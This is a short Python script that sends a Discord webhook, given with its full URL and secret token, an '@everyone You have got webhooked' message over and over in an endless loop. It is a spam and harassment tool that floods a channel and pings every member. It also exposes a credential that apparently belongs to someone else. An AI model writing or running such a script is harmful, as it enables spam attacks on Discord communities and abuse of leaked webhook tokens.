import requests

webhooks = ["https://discord.com/api/webhooks/1079123558019649567/nkDVf0UnU3RxFfu_PINmCo1v3l4tZDqpC_TAgRgaW43svKnzOB9i47x3nH53hbTDCA6A"] 
data = {"content": "@everyone You have got webhooked"}

while True:
    for url in webhooks:
        response = requests.post(url, json=data)

        if response.status_code == 204:
            print("Message sent successfully")
        else:
            print("Message sending failed with status code:", response.status_code)
